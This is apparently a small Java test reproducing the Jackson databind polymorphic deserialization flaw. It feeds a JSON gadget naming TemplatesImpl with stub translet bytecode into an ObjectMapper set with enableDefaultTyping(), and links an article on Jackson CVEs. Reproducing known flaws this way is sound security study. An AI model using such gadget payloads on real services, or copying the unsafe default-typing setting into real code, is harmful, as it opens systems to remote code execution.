package com.asd;

import com.fasterxml.jackson.databind.ObjectMapper;

public class TestSerialization {

    static class Bean1599 {
        public int id;
        public Object obj;

        public int getId() {
            return id;
        }

        public void setId(int id) {
            this.id = id;
        }

        public Object getObj() {
            return obj;
        }

        public void setObj(Object obj) {
            this.obj = obj;
        }
    }

    // https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062
    public static void main(String[] args) throws Exception {
        final String JSON = "{ \"id\": 124,\n"
                + " \"obj\" :[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
                + "  {\n"
                + "    \"transletBytecodes\" : [ \"AAIAZQ==\" ],\n"
                + "    \"transletName\" : \"a.b\"\n"
                + "  }\n"
                + " ]\n"
                + "}";
        System.out.println(JSON);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(JSON, Bean1599.class);

    }

}
